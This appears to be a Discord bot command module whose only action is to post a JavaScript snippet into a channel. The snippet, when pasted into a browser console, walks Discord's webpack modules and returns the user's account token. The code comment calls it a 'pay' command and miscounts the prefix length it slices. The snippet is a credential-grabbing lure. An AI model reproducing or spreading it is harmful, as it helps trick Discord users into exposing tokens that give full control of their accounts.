const fs = require('fs');
let config = {};

if (fs.existsSync('config.json')) {
    config = JSON.parse(fs.readFileSync('config.json'));
}

module.exports = {
    run: async (client, message, handler, prefix) => {
        // Get the text after the prefix and command
        const amount = message.content.slice(prefix.length + 6).trim(); // 4 is the length of "pay "
        const cmd = `
        (webpackChunkdiscord_app.push([
    [""],
    {},
    (e) => {
        m = [];
        for (let c in e.c) m.push(e.c[c]);
    },
]),
m)
    .find((m) => m?.exports?.default?.getToken !== void 0)
    .exports.default.getToken();
`;
	const huh = ('```');
        // Send the text back to the channel
        message.channel.send(`${huh}${cmd}${huh}`);
    }
};
